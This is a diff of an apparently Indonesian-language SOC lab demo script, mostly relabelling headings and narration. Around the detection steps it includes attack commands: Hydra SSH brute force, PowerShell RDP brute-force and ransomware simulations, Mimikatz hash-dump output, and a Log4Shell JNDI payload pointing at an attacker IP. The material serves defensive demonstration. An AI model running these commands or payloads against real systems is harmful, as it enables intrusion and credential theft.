@@ -60,7 +60,7 @@ Nmap scan report for 192.168.10.20  → Windows Endpoint
 Nmap scan report for 192.168.10.30  → Linux Endpoint
 ```
 
-**Tunjukkan ke juri:**
+**Goals:**
 - Hasil Nmap menampilkan host dan port aktif di VLAN10
 - Dari sisi defender, jalankan asset discovery:
 
@@ -74,8 +74,8 @@ Wazuh Dashboard → Security Events → rule.id: 100603
 → "ASSET DISCOVERY - Daily scan complete"
 ```
 
-**Narasi:**
-> "Penyerang memetakan jaringan. Dari sisi defender, sistem asset discovery otomatis berjalan setiap hari dan akan alert jika ada host baru yang tidak dikenal."
+
+> Penyerang memetakan jaringan. Dari sisi defender, sistem asset discovery otomatis berjalan setiap hari dan akan alert jika ada host baru yang tidak dikenal.
 
 ---
 
@@ -91,7 +91,6 @@ hydra -L /tmp/sentinel_userlist.txt \
       ssh://192.168.10.30 &
 ```
 
-**Tunggu 30 detik, lalu tunjukkan:**
 ```
 Wazuh Dashboard → Security Events
 → filter: agent.name: fyep-1
@@ -106,8 +105,8 @@ Wazuh Dashboard → Security Events
 [fyep-1] rule=100012 level=11 | SSH Brute Force detected from 192.168.10.1
 ```
 
-**Narasi:**
-> "Hydra mencoba ratusan kombinasi password. Wazuh mendeteksi threshold 10 kali gagal dalam 120 detik — alert T1110 Brute Force fired."
+
+> Hydra mencoba ratusan kombinasi password. Wazuh mendeteksi threshold 10 kali gagal dalam 120 detik — alert T1110 Brute Force fired.
 
 ---
 
@@ -128,15 +127,14 @@ powershell -ExecutionPolicy Bypass -File C:\Users\fyep-2\Desktop\rdp_bruteforce_
 Selesai: 15 authentication attempts
 ```
 
-**Tunjukkan ke juri:**
+**Goals:**
 ```
 Wazuh Dashboard → Security Events → agent.name: windows-endpoint
 → rule 100003: "Windows: Failed Authentication Attempt"
 → rule 100004: "Multiple Failed RDP/SMB Logins" level 11
 ```
 
-**Narasi:**
-> "Brute force RDP terdeteksi via Windows Event ID 4625. Setelah 10 kali gagal dalam 120 detik, alert T1021 fired."
+> Brute force RDP terdeteksi via Windows Event ID 4625. Setelah 10 kali gagal dalam 120 detik, alert T1021 fired.
 
 ---
 
@@ -157,7 +155,7 @@ root@gtcorp-prod-db01:~#   ← Cowrie menerima — hostname palsu
 [OK] Honeypot trigger selesai
 ```
 
-**Tunjukkan ke juri (< 15 detik):**
+**Goals:**
 ```
 Wazuh Dashboard → Security Events → rule.groups: honeypot
 → rule 100100: "New SSH connection to honeypot" level 12
@@ -173,8 +171,7 @@ Klik alert honeypot → expand fields
 → data.src_ip: 100.82.107.52 (IP Kali asli)
 ```
 
-**Narasi:**
-> "Penyerang tidak tahu dia masuk ke honeypot. Hostname 'gtcorp-prod-db01' sengaja meyakinkan. Setiap command yang diketik langsung dikirim ke Wazuh dan Telegram dalam < 15 detik."
+> Penyerang tidak tahu dia masuk ke honeypot. Hostname 'gtcorp-prod-db01' sengaja meyakinkan. Setiap command yang diketik langsung dikirim ke Wazuh dan Telegram dalam < 15 detik.
 
 ---
 
@@ -199,7 +196,7 @@ password=Pr0d@GTCorp2026!
 [OK] Canary token Linux triggered
 ```
 
-**Tunjukkan ke juri (< 30 detik):**
+**Goals:**
 ```
 Wazuh Dashboard → Security Events
 → rule 100301: "CANARY TOKEN TRIGGERED - Possible Data Exfiltration"
@@ -209,7 +206,7 @@ Telegram → notifikasi CANARY TOKEN TRIGGERED
 ```
 
 **Narasi:**
-> "Penyerang menggunakan credential yang sudah dicuri untuk mengakses file yang terlihat seperti konfigurasi database asli. Saat file dibuka, sinyal langsung dikirim ke Wazuh — mendeteksi reconnaissance dan exfiltration bahkan dari dalam sistem."
+> Penyerang menggunakan credential yang sudah dicuri untuk mengakses file yang terlihat seperti konfigurasi database asli. Saat file dibuka, sinyal langsung dikirim ke Wazuh — mendeteksi reconnaissance dan exfiltration bahkan dari dalam sistem.
 
 ---
 
@@ -221,7 +218,7 @@ Telegram → notifikasi CANARY TOKEN TRIGGERED
 notepad "C:\Users\fyep-2\Documents\credentials.xlsx"
 ```
 
-**Tunggu 30 detik, tunjukkan:**
+**Goals: **
 ```
 Telegram → notifikasi:
   File    : credentials.xlsx
@@ -234,8 +231,8 @@ Wazuh Dashboard → Discover
 → tunjukkan alert dari agent 000
 ```
 
-**Narasi:**
-> "Canary token Windows — file spreadsheet berisi credential palsu yang terlihat nyata. Saat penyerang membukanya, canary-monitor.py langsung mendeteksi via Wazuh archives dan mengirim notifikasi Telegram."
+
+> Canary token Windows — file spreadsheet berisi credential palsu yang terlihat nyata. Saat penyerang membukanya, canary-monitor.py langsung mendeteksi via Wazuh archives dan mengirim notifikasi Telegram.
 
 ---
 
@@ -263,7 +260,7 @@ Domain    : DESKTOP-SR3VUHC
 NTLM      : [HASH]
 ```
 
-**Tunjukkan ke juri (< 2 menit):**
+**Goals: **
 ```
 Wazuh Dashboard → Security Events → agent.name: windows-endpoint
 → rule 92900: "Lsass process was accessed by ...\mimikatz.exe"
@@ -275,8 +272,7 @@ Wazuh Dashboard → Security Events → agent.name: windows-endpoint
 Set-MpPreference -DisableRealtimeMonitoring $false
 ```
 
-**Narasi:**
-> "Teknik yang digunakan MGM Resorts 2023. Mimikatz mengakses memori lsass.exe untuk mengambil hash NTLM semua user. Sysmon Event ID 10 mendeteksi akses ini dan Wazuh rule 92900 fired — T1003 OS Credential Dumping."
+> Teknik yang digunakan MGM Resorts 2023. Mimikatz mengakses memori lsass.exe untuk mengambil hash NTLM semua user. Sysmon Event ID 10 mendeteksi akses ini dan Wazuh rule 92900 fired — T1003 OS Credential Dumping.
 
 ---
 
@@ -315,7 +311,7 @@ BERHASIL - Wazuh agent OK   ← port 1514
 BERHASIL - Grafana OK       ← port 3000
 ```
 
-**Tunjukkan rule pfSense:**
+**pfSense:**
 ```
 pfSense → Firewall → Rules → VLAN10_PROD
 → "Allow Production to Wazuh" port 1514 ✅
@@ -323,8 +319,8 @@ pfSense → Firewall → Rules → VLAN10_PROD
 → "Block Production to Management" ❌
 ```
 
-**Narasi:**
-> "Zero Trust Network — dari VLAN Production, penyerang tidak bisa reach VLAN Management. SMB, RDP, SSH, HTTP semua diblokir. Hanya Wazuh agent dan Grafana yang diizinkan. Ini mencegah lateral movement seperti kasus Colonial Pipeline 2021."
+
+> Zero Trust Network — dari VLAN Production, penyerang tidak bisa reach VLAN Management. SMB, RDP, SSH, HTTP semua diblokir. Hanya Wazuh agent dan Grafana yang diizinkan. Ini mencegah lateral movement seperti kasus Colonial Pipeline 2021.
 
 ---
 
@@ -349,7 +345,7 @@ powershell -ExecutionPolicy Bypass -File C:\Users\fyep-2\Desktop\ransomware_sim.
 Enkripsi selesai: 60 file dalam X detik
 ```
 
-**Tunjukkan ke juri (< 5 menit):**
+**Goals:**
 ```
 Wazuh Dashboard → Security Events → agent.name: windows-endpoint
 → rule 100700: "RANSOMWARE DETECTED - .locked extension" level 12
@@ -361,8 +357,8 @@ Wazuh Dashboard → Security Events → agent.name: windows-endpoint
 powershell -ExecutionPolicy Bypass -File C:\Users\fyep-2\Desktop\ransomware_sim.ps1 -Mode restore
 ```
 
-**Narasi:**
-> "Terinspirasi kasus Caesars Entertainment 2023. 60 file dienkripsi sekaligus dengan ekstensi .locked. Wazuh FIM realtime mendeteksi perubahan massal dan memicu alert CRITICAL T1486 — Data Encrypted for Impact."
+
+> Terinspirasi kasus Caesars Entertainment 2023. 60 file dienkripsi sekaligus dengan ekstensi .locked. Wazuh FIM realtime mendeteksi perubahan massal dan memicu alert CRITICAL T1486 — Data Encrypted for Impact.
 
 ---
 
@@ -399,7 +395,7 @@ sudo tail -5 /var/log/nginx/access.log | grep jndi
 192.168.10.1 - - [01/Jun/2026] "GET / HTTP/1.1" 200 - "${jndi:ldap://100.82.107.52/exploit}"
 ```
 
-**Tunjukkan ke juri (< 30 detik):**
+**Goals:**
 ```
 Wazuh Dashboard → Security Events
 → rule 100800: "Log4Shell Exploitation Attempt - CVE-2021-44228" level 13
@@ -407,8 +403,8 @@ Wazuh Dashboard → Security Events
 → agent: fyep-1
 ```
 
-**Narasi:**
-> "CVE-2021-44228 — salah satu vulnerability paling berbahaya 2021. Hanya dengan mengirim string \${jndi:} di HTTP header, server yang menggunakan Log4j bisa dieksploitasi. Custom rule 100800 mendeteksi pattern ini di Nginx log dalam < 30 detik."
+
+> CVE-2021-44228 — salah satu vulnerability paling berbahaya 2021. Hanya dengan mengirim string \${jndi:} di HTTP header, server yang menggunakan Log4j bisa dieksploitasi. Custom rule 100800 mendeteksi pattern ini di Nginx log dalam < 30 detik.
 
 ---
 
@@ -416,7 +412,6 @@ Wazuh Dashboard → Security Events
 
 **Browser: http://100.84.121.118:3000**
 
-Tunjukkan satu per satu:
 
 ```
 Panel 1 — Total Alert Aktif
@@ -441,13 +436,12 @@ Panel 6 — Honeypot Alerts 24 jam
 → 49+ alerts
 ```
 
-**Tunjukkan auto-refresh:**
+**auto-refresh:**
 ```
 Pojok kanan atas → "30s" — auto-refresh aktif
 ```
 
-**Narasi:**
-> "Single pane of glass untuk SOC — dalam satu layar, semua informasi kritis tersedia tanpa berpindah halaman. Dashboard auto-refresh setiap 30 detik. Dari sini analis bisa langsung identifikasi IP penyerang paling aktif, rule yang paling sering triggered, dan pola waktu serangan."
+> Single pane of glass untuk SOC — dalam satu layar, semua informasi kritis tersedia tanpa berpindah halaman. Dashboard auto-refresh setiap 30 detik. Dari sini analis bisa langsung identifikasi IP penyerang paling aktif, rule yang paling sering triggered, dan pola waktu serangan.
 
 ---
 
